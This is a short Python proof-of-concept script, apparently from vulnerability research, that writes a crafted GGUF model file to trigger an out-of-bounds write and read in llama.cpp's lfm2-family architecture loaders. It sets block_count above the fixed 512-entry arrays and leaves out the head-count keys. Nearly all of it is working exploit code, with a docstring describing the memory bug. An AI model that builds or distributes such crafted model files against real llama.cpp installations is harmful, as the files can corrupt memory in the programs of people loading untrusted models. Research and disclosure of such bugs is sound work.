#!/usr/bin/env python3
"""
Craft a minimal GGUF that triggers an OOB write in llama_model_lfm2::load_arch_hparams.

Bug: arch loaders (lfm2, lfm2moe, jamba, granite-hybrid, kimi-linear, nemotron-h,
plamo2) loop `for il < hparams.n_layer()` writing fixed `std::array<*,512>`:
    hparams.is_recr_impl[il] = hparams.n_head_kv(il) == 0;
n_layer() == n_layer_all - n_layer_nextn, defaults to block_count. With
block_count > 512 this both WRITES is_recr_impl OOB and READS n_head_kv_arr OOB
(n_head_kv(il) only guards il < n_layer_all, not < LLAMA_MAX_LAYERS).

Run:  python3 craft_oob_lfm2.py out.gguf [block_count]
"""
import sys, os
from pathlib import Path
gguf_path = Path(__file__).resolve().parent.parent / "llama.cpp" / "gguf-py"
sys.path.insert(0, str(gguf_path))
import gguf
V = gguf.GGUFValueType

def main():
    out = sys.argv[1] if len(sys.argv) > 1 else "models/crafted/lfm2_oob.gguf"
    block_count = int(sys.argv[2]) if len(sys.argv) > 2 else 600
    os.makedirs(os.path.dirname(out) or ".", exist_ok=True)
    w = gguf.GGUFWriter(out, arch="lfm2")
    def kv(k, v, t): w.add_key_value(k, v, t)
    # base loader required keys
    kv("lfm2.context_length", 2048, V.UINT32)
    kv("lfm2.embedding_length", 64, V.UINT32)
    kv("lfm2.block_count", block_count, V.UINT32)
    # lfm2 load_arch_hparams required keys
    kv("lfm2.shortconv.l_cache", 4, V.UINT32)
    kv("lfm2.attention.layer_norm_rms_epsilon", 1e-6, V.FLOAT32)
    # OMIT feed_forward_length / attention.head_count[_kv] so n_head_kv stays 0;
    # n_layer_nextn stays 0 so n_layer() == n_layer_all == block_count.
    w.write_header_to_file(); w.write_kv_data_to_file(); w.write_ti_data_to_file(); w.close()
    print(f"[+] wrote {out}  block_count={block_count}")

if __name__ == "__main__":
    main()